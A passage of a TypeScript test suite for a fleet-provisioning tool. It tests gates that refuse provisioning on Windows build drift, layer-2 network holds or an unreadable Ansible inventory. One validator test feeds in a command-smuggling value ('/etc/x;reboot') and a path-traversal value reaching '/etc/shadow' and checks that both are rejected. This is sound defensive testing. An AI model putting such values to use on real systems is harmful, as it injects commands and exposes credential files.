    "the build-literal pattern cannot see a build literal -- it has narrowed to something that matches "
    + "nothing, and the assertion above would then be vacuous");
});

/**
 * #1204: THE CALL #1084 SAID WAS MISSING.
 *
 * #1084's own header: **"NOTHING CALLS THIS YET, AND SAYING SO IS THE POINT … A function that is
 * perfect and never reached is the defect this repository has hit three times in a week."** All five of
 * #1204's acceptance clauses were already satisfied by that row — measured before building, including
 * driving its mutation (comparison always equal: 38/0 -> 35/3, red by name). What was NOT satisfied is
 * the row's TITLE: `fleet:provision` refused nothing, because the refusal was unreached.
 *
 * These assert the wiring, injected, so the suite drives it without a fleet. **A run against real boxes
 * stays #921's** and this row does not claim it.
 */
// THREE SEGMENTS, because `buildOf` extracts `<major>.<minor>.<build>` and documents that it does.
// My first fixture used a four-segment value with the UBR, which can never match what `buildOf` returns --
// so clause 2's control failed and the code was right. A fixture inventing a format the parser does not
// produce tests the fixture, not the parser.
const PINNED = "10.0.26100";
const inventoryWithPin = `all:\n  children:\n    a11y_workers:\n      vars:\n        windows_build: "${PINNED}"\n`;

test("#1204 clause 1: a drifted box REFUSES the provisioning run, naming the box and BOTH builds", () => {
  const { refusal } = buildGate({
    chosen: "provision-role.yml",
    inventoryText: inventoryWithPin,
    guests: [{ name: "a11y-worker-7", windowsVersion: `Microsoft Windows 11 Pro 10.0.22631.1` }],
  });
  // POSITIVE CONTROL: the two builds being compared are printed before anything is asserted about them.
  // A module that failed to load and a comparison that found nothing produce the same empty refusal.
  assert.ok(refusal, `expected a refusal comparing 22631 against pinned ${PINNED}; got null`);
  assert.match(String(refusal), /a11y-worker-7/, "the box must be named");
  assert.match(String(refusal), /22631/, "and the build it is ON");
  assert.match(String(refusal), new RegExp(PINNED.replace(/\./g, "\\.")), "and the build it SHOULD be on");
});

test("#1204 clause 2: a box on the pin provisions normally -- the control", () => {
  // Without this, a gate that refuses everything is indistinguishable from one that works.
  const { refusal, notice } = buildGate({
    chosen: "provision-role.yml",
    inventoryText: inventoryWithPin,
    guests: [{ name: "a11y-worker-2", windowsVersion: `Microsoft Windows 11 Pro ${PINNED}.4946` }],
  });
  assert.equal(refusal, null, `a box on the pin must not be refused; got: ${refusal}`);
  assert.match(String(notice), /1 on the pin, 0 drifted, 0 unreadable, of 1 asked/,
    "and the census is printed anyway -- 'no box drifted' and 'no box was asked' are different facts");
});

test("#1204 clause 5: a box that could not be ASKED is refused distinguishably, never as agreement", () => {
  // `guestBuilds` is where the collapse would happen: a missing field read as an empty string lands in
  // `compliant` and reports a box nobody reached as on the pin. "I could not ask" and "it matches" are
  // different answers and this is the seam that keeps them apart.
  assert.deepEqual(guestBuilds([{ name: "a11y-worker-9" }]),
    [{ name: "a11y-worker-9", windowsVersion: null }],
    "a probe that never reached the box must yield null, not an empty string");
  const { notice } = buildGate({
    chosen: "provision-role.yml",
    inventoryText: inventoryWithPin,
    guests: guestBuilds([{ name: "a11y-worker-9" }]),
  });
  assert.match(String(notice), /COULD NOT READ the build of a11y-worker-9/,
    "an unreachable box must be SAID, not folded into compliant or drifted");
  assert.match(String(notice), /0 on the pin, 0 drifted, 1 unreadable/);
});

test("#1204: only the PROVISIONING playbook is gated -- the repair paths are not blocked", () => {
  // `deploy.yml` pulls code onto boxes that already exist; `recover.yml` acts on one that is already
  // wedged. Refusing those on a build mismatch blocks the repair path, which is the same trade
  // `fleet:deploy`'s busy-worker guard makes in the other direction.
  const drifted = [{ name: "a11y-worker-7", windowsVersion: "Microsoft Windows 11 Pro 10.0.22631.1" }];
  for (const chosen of ["deploy.yml", "recover.yml", "sleep.yml"]) {
    const gate = buildGate({ chosen, inventoryText: inventoryWithPin, guests: drifted });
    assert.deepEqual(gate, { refusal: null, notice: null },
      `${chosen} must not be gated on the build pin -- it is not how a box joins the fleet`);
  }
  // And the control: the same drifted box DOES refuse the one playbook that is gated, so the loop above
  // is not passing because `buildGate` refuses nothing at all.
  assert.ok(buildGate({ chosen: "provision-role.yml", inventoryText: inventoryWithPin, guests: drifted }).refusal,
    "the same input must refuse provision-role.yml, or the exemptions above prove nothing");
});

/**
 * #1204: THE CALL EXISTS — the defect this row fixes, applied to the row's own fix.
 *
 * Commenting out `await enforceBuildPin(chosen)` left the suite at 42/0. Every clause above drives
 * `buildGate` directly, so they all pass while `fleet:provision` refuses nothing — which is **#1084's
 * exact state restored**: *"a function that is perfect and never reached"*. Building the call without
 * pinning it rebuilt the defect one layer up, in the fix for it.
 *
 * COMMENTS STRIPPED, because commenting the call out IS the mutation — a text search that counts prose
 * passes on the very edit it exists to catch. Three rows tonight have turned on that.
 */
test("#1204: main() CALLS the build gate -- an unreached refusal is the defect it replaces", () => {
  const source = readFileSync(new URL("./fleet-playbook.mjs", import.meta.url), "utf8")
    .replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
  assert.match(source, /await enforceBuildPin\(/,
    "nothing calls enforceBuildPin, so `fleet:provision` refuses nothing and every other clause in this "
    + "file passes anyway -- they drive `buildGate` directly. That is #1084's state, which this row "
    + "exists to end: a perfect comparison that no run reaches");
  // AND IT MUST RUN BEFORE THE PLAYBOOK DOES. A refusal that arrives mid-provision has already changed
  // the guest it is refusing, and the ordering is not visible from the call's existence alone.
  //
  // SCOPED TO `main`'S BODY, because the first `runBootstrapFromHere(` in the file is its own
  // DECLARATION, hundreds of lines above the call. My first version compared against that and failed on
  // correct code -- the instrument found a real occurrence of the right string in the wrong place.
  const mainBody = source.slice(source.indexOf("async function main() {"));
  assert.ok(mainBody.indexOf("await enforceBuildPin(") < mainBody.indexOf("runBootstrapFromHere("),
    "the gate must run before any playbook touches a box");
});

// --- #1313: a layer-2 HOLD refuses fleet:deploy and fleet:provision unless each held box is named ---

const HOLD = { hold: true, off: ["a11y-worker-3"], unknown: ["a11y-worker-5"] };

test("#1313 ACCEPTANCE 1: a HOLD with one OFF and one UNKNOWN box refuses, naming both in separate lists", () => {
  for (const chosen of ["deploy.yml", "provision-role.yml"]) {
    const { refusal, notice } = linkGate({ chosen, gate: HOLD, allowOffline: [] });
    assert.ok(refusal, `${chosen} must refuse a layer-2 HOLD`);
    assert.match(String(refusal), /off the network: +a11y-worker-3\n/, String(refusal));
    assert.match(String(refusal), /unknown: +a11y-worker-5\n/, "UNKNOWN holds exactly as OFF does, on its own line");
    assert.equal(notice, null);
  }
});

test("#1313 ACCEPTANCE 2: --allow-offline naming only one of the two still refuses, and names the other", () => {
  const onlyOff = linkGate({ chosen: "deploy.yml", gate: HOLD, allowOffline: ["a11y-worker-3"] });
  assert.match(String(onlyOff.refusal), /unknown: +a11y-worker-5\n/, String(onlyOff.refusal));
  assert.match(String(onlyOff.refusal), /off the network: +none\n/);
  assert.match(String(onlyOff.refusal), /already named with --allow-offline: a11y-worker-3/);
  const onlyUnknown = linkGate({ chosen: "provision-role.yml", gate: HOLD, allowOffline: ["a11y-worker-5"] });
  assert.match(String(onlyUnknown.refusal), /off the network: +a11y-worker-3\n/, String(onlyUnknown.refusal));
});

test("#1313 ACCEPTANCE 3: --allow-offline naming both dispatches, and says what it proceeds past", () => {
  const both = linkGate({ chosen: "provision-role.yml", gate: HOLD, allowOffline: ["a11y-worker-5", "a11y-worker-3"] });
  assert.equal(both.refusal, null, String(both.refusal));
  assert.match(String(both.notice), /proceeding past a layer-2 HOLD: a11y-worker-3, a11y-worker-5/);
});

test("#1313 ACCEPTANCE 4: --allow-offline=<a box that is not held> is refused by name", () => {
  const stray = linkGate({ chosen: "deploy.yml", gate: HOLD, allowOffline: ["a11y-worker-3", "a11y-worker-5", "a11y-worker-9"] });
  assert.match(String(stray.refusal), /refusing --allow-offline=a11y-worker-9: not held \(the hold is a11y-worker-3, a11y-worker-5\)/,
    String(stray.refusal));
  const nothingHeld = linkGate({ chosen: "deploy.yml", gate: null, allowOffline: ["a11y-worker-9"] });
  assert.match(String(nothingHeld.refusal), /refusing --allow-offline=a11y-worker-9: no box is held/);
});

test("#1313 clause 3: no hold, and no gate at all, dispatch exactly as today with no flag", () => {
  assert.deepEqual(linkGate({ chosen: "deploy.yml", gate: null, allowOffline: [] }), { refusal: null, notice: null });
  assert.deepEqual(linkGate({ chosen: "deploy.yml", gate: { hold: false, off: [], unknown: [] }, allowOffline: [] }),
    { refusal: null, notice: null });
  assert.ok(linkGate({ chosen: "deploy.yml", gate: HOLD, allowOffline: [] }).refusal,
    "and the control: the same playbook DOES refuse a hold, so the two lines above are not passing because nothing refuses");
});

test("#1313: only deploy and provision are gated -- the repair paths are not blocked, and do not take --allow-offline", () => {
  for (const chosen of ["recover.yml", "sleep.yml", "collect-logs.yml"]) {
    assert.deepEqual(linkGate({ chosen, gate: HOLD, allowOffline: [] }), { refusal: null, notice: null },
      `${chosen} acts on boxes that are already in trouble, so a hold must not block it`);
    assert.match(String(linkGate({ chosen, gate: HOLD, allowOffline: ["a11y-worker-3"] }).refusal),
      /only deploy\.yml and provision-role\.yml read the layer-2 gate/);
  }
});

test("#1313: --allow-offline is repeatable, which flagValue is not", () => {
  assert.deepEqual(allowOfflineNames(["--playbook=deploy.yml", "--allow-offline=a11y-worker-3", "--allow-offline=a11y-worker-5"]),
    ["a11y-worker-3", "a11y-worker-5"]);
  assert.deepEqual(allowOfflineNames(["--playbook=deploy.yml"]), []);
});

/** COMMENTS STRIPPED, for #1204's reason: commenting the call out IS the mutation a prose search agrees with. */
test("#1313: main() CALLS the layer-2 gate, on the inventory, before the control plane is asked to move", () => {
  const source = readFileSync(new URL("./fleet-playbook.mjs", import.meta.url), "utf8")
    .replace(/\/\*[\s\S]*?\*\//g, "").replace(/^\s*\/\/.*$/gm, "");
  const mainBody = source.slice(source.indexOf("async function main() {"));
  assert.match(mainBody, /await enforceLinkGate\(chosen\)/, "a perfect gate that no run reaches refuses nothing");
  assert.ok(mainBody.indexOf("await enforceLinkGate(") < mainBody.indexOf("ssh(controlPlaneCheckout("),
    "the gate must run before the control plane's checkout moves");
  assert.match(source, /"--allow-offline="/, "the flag guard must know the flag, or refuseUnknownFlags kills the run first");
  assert.match(source, /inventorySources\(ansibleCfgText\)/, "the fleet comes from the sources ansible.cfg lists");
  assert.match(source, /ssh\(inventoryReadScript\(paths\)/, "read on the control plane, where the playbook runs, not this checkout");
});

// --- #1343 review (worker-judge, not convinced): the gate reads the CONTROL PLANE's inventory, and cannot-know refuses ---

const ANSIBLE_CFG = readFileSync(new URL("../ansible/ansible.cfg", import.meta.url), "utf8");
const GROUP_VARS = readFileSync(new URL("../ansible/group_vars/a11y_workers.yml", import.meta.url), "utf8");
const INSTALLED = "/etc/a11ign/inventory.yml";
/** An inventory shaped like the real one, on documentation addresses. */
const inventoryOf = (hosts: number[]) => ["all:", "  children:", "    a11y_workers:", "      hosts:",
  ...hosts.flatMap((n) => [`        a11y-worker-${n}:`, `          ansible_host: 192.0.2.${n}`])].join("\n") + "\n";
type GateStatus = NonNullable<Parameters<typeof linkGateFor>[0]["status"]>;
type Fleet = { name: string, url: string }[];

/** `linkGateFor` with the real ansible.cfg and group_vars, recording which sources were read and which boxes were asked. */
const driveGate = (chosen: string, reads: () => { path: string, text: string }[], hold?: (workers: Fleet) => string[]) => {
  const asked: Fleet[] = [];
  const readPaths: string[][] = [];
  const status: GateStatus = async ({ workers }) => {
    asked.push(workers());
    const off = hold ? hold(workers()) : [];
    return { linkLayer: { lines: off.map((name) => `OFF THE NETWORK (no layer-2 answer from ${name}: check cable and power)`),
      gate: off.length ? { hold: true, off, unknown: [] } : null } };
  };
  const result = linkGateFor({ chosen, argv: [], ansibleCfgText: ANSIBLE_CFG, groupVarsText: GROUP_VARS, status,
    readInventories: (paths) => { readPaths.push(paths); return reads(); } });
  return { result, asked, readPaths };
};

test("#1343: the gate's sources are ansible.cfg's own -- installed first, the in-tree fallback in the control plane's checkout", () => {
  assert.deepEqual(inventorySources(ANSIBLE_CFG), [INSTALLED, `${CONTROL_PLANE_CHECKOUT_PATH}/packages/control/ansible/inventory.yml`]);
  assert.throws(() => inventorySources("[defaults]\n"), /no `inventory =` line/);
  assert.throws(() => inventorySources("inventory = /etc/x;reboot\n"), /not a plain path/);
  assert.throws(() => inventorySources("inventory = ../../etc/shadow\n"), /not a plain path/);
  assert.match(inventoryReadScript([INSTALLED]),
    /^if \[ -f \/etc\/a11ign\/inventory\.yml \]; then echo '==> \/etc\/a11ign\/inventory\.yml'; cat \/etc\/a11ign\/inventory\.yml; fi$/);
  assert.deepEqual(parseInventoryReads("==> /a\nall:\n==> /b\nx: 1"), [{ path: "/a", text: "all:\n" }, { path: "/b", text: "x: 1\n" }]);
  assert.deepEqual(parseInventoryReads(""), [], "no source existed prints nothing, which is no reads -- not an empty one");
});

test("#1343 BLOCKER: no inventory on the control plane REFUSES deploy and provision, and asks nobody", async () => {
  for (const chosen of ["deploy.yml", "provision-role.yml"]) {
    const { result, asked } = driveGate(chosen, () => []);
    const { refusal, notice } = await result;
    assert.match(String(refusal), /cannot know which boxes this playbook targets -- no inventory exists at \/etc\/a11ign\/inventory\.yml or /,
      `${chosen}: zero boxes asked must refuse, never read as nothing held; got ${refusal}`);
    assert.match(String(refusal), /npm run fleet:inventory-install/, "and it says how to get an inventory there");
    assert.equal(notice, null);
    assert.equal(asked.length, 0, "there is no fleet to ask about, so the layer-2 read must not run");
  }
});

test("#1343: a malformed inventory, a workerless one and an unreachable control plane refuse, each in its own words", async () => {
  const malformed = await driveGate("provision-role.yml",
    () => [{ path: INSTALLED, text: inventoryOf([2]).replace("ansible_host: 192.0.2.2", "ansible_host: 192.0.2.2 trailing") }]).result;
  assert.match(String(malformed.refusal),
    /\/etc\/a11ign\/inventory\.yml was refused by the inventory parser: .*looks like a host entry but does not parse/, String(malformed.refusal));
  const workerless = await driveGate("deploy.yml",
    () => [{ path: INSTALLED, text: "all:\n  children:\n    a11y_control:\n      hosts: {}\n" }]).result;
  assert.match(String(workerless.refusal),
    /\/etc\/a11ign\/inventory\.yml was refused by the inventory parser: no hosts found under a11y_workers\.hosts/, String(workerless.refusal));
  assert.doesNotMatch(String(workerless.refusal), /does not parse|no inventory exists/, "three causes, three wordings");
  const unreachable = await driveGate("deploy.yml", () => { throw new Error("ssh to the control plane failed: Connection timed out"); }).result;
  assert.match(String(unreachable.refusal),
    /the control plane's inventory could not be read \(ssh to the control plane failed: Connection timed out\)\. Could not ask is not may proceed/);
});

test("#1343: a readable inventory asks exactly its workers by inventory name, merges identical sources, and a HOLD among them refuses", async () => {
  const both = [{ path: INSTALLED, text: inventoryOf([2, 3]) },
    { path: `${CONTROL_PLANE_CHECKOUT_PATH}/packages/control/ansible/inventory.yml`, text: inventoryOf([2, 3]) }];
  const held = driveGate("deploy.yml", () => both, (workers) => [workers[0].name]);
  const { refusal } = await held.result;
  assert.equal(held.readPaths[0][0], INSTALLED, "the installed inventory is read first, as ansible.cfg orders it");
  assert.deepEqual(held.asked[0].map(({ name }) => name), ["a11y-worker-2", "a11y-worker-3"],
    "identical sources merge, as Ansible merges them, and each box is named as --allow-offline takes it");
  assert.match(held.asked[0][0].url, /^http:\/\/192\.0\.2\.2:\d+$/);
  assert.match(String(refusal), /off the network: +a11y-worker-2\n/, String(refusal));
  const clear = await driveGate("deploy.yml", () => both).result;
  assert.deepEqual(clear, { refusal: null, notice: null, lines: [] }, "and the same fleet with nothing silent dispatches as today");
});

test("#1343: a repair playbook reads no inventory and asks no box", async () => {
  const { result, readPaths, asked } = driveGate("recover.yml", () => { throw new Error("recover.yml must not read the inventory"); });
  assert.deepEqual(await result, { refusal: null, notice: null, lines: [] });
  assert.equal(readPaths.length, 0);
  assert.equal(asked.length, 0);
});

// --- #1356: guardProtocolChange asks the CONTROL PLANE's inventory, never a checkout's own inventory.yml ---

test("#1356: protocolGuardVerdict refuses in its OWN words when the fleet could not be resolved -- never "
  + "falling through to protocolVerdict's \"no worker answered\", which implies a silent fleet rather than "
  + "an operator host with no address to try", () => {
  const refused = protocolGuardVerdict({
    chosen: "deploy.yml", local: "19", allowed: false, served: [],
    fleet: { workers: [], refusal: "no inventory exists at /etc/a11ign/inventory.yml on the control plane" },
  });
  assert.equal(refused.refuse, true);
  assert.match(refused.message, /^REFUSING deploy\.yml: could not learn which boxes this deploy will touch -- /);
  assert.match(refused.message, /no inventory exists at \/etc\/a11ign\/inventory\.yml/);
  assert.doesNotMatch(refused.message, /no worker answered/, "this is a DIFFERENT failure -- never asked, not asked and silent");
});

test("#1356: protocolGuardVerdict asks the CONTROL PLANE's own workers -- a real fleet with no local "
  + "inventory.yml still gets a real answer, matching #1343's own review shape", () => {
  const fleet = { workers: [{ name: "a11y-worker-2", url: "http://192.0.2.2:8765" },
    { name: "a11y-worker-3", url: "http://192.0.2.3:8765" }], refusal: null };
  const agree = protocolGuardVerdict({
    chosen: "deploy.yml", local: "19", allowed: false, fleet,
    served: [{ worker: "http://192.0.2.2:8765", protocol: "19" }, { worker: "http://192.0.2.3:8765", protocol: "19" }],
  });
  assert.equal(agree.refuse, false);
  assert.equal(agree.message, "", "the fleet agrees, so there is nothing to say");

  const differ = protocolGuardVerdict({
    chosen: "deploy.yml", local: "19", allowed: false, fleet,
    served: [{ worker: "http://192.0.2.2:8765", protocol: "18" }, { worker: "http://192.0.2.3:8765", protocol: "18" }],
  });
  assert.equal(differ.refuse, true);
  assert.match(differ.message, /REFUSING TO DEPLOY: this checkout has CAPTURE_PROTOCOL_VERSION = 19/);
  assert.match(differ.message, /asked 2 worker\(s\) from the control plane's inventory\.$/,
    "the source is the control plane's inventory, never a checkout's own inventory.yml");
});

test("#1356 MUTATION TARGET: fleet.refusal must be checked before protocolVerdict runs, or an unresolved "
  + "fleet (served: []) reads as protocolVerdict's OWN empty-fleet case instead of this guard's own", () => {
  // Reproduces the original defect exactly: no `fleet.refusal` check at all, `served` stays `[]` because
  // there were no workers to ask, and `protocolVerdict` alone decides -- "no worker answered /health",
  // which is a real but DIFFERENT claim from "this host had no inventory to ask in the first place".
  const unresolved = protocolVerdict({ local: "19", served: [], allowed: false, source: "CAPTURE_PROTOCOL_VERSION" });
  assert.equal(unresolved.refuse, true, "protocolVerdict alone still refuses (the gate held before this fix too)");
  assert.match(unresolved.message, /no worker answered \/health/, "but for the WRONG reason without #1356's guard");

  const guarded = protocolGuardVerdict({
    chosen: "deploy.yml", local: "19", allowed: false, served: [],
    fleet: { workers: [], refusal: "no inventory exists at /etc/a11ign/inventory.yml on the control plane" },
  });
  assert.doesNotMatch(guarded.message, /no worker answered/, "#1356's own refusal must win instead");
});
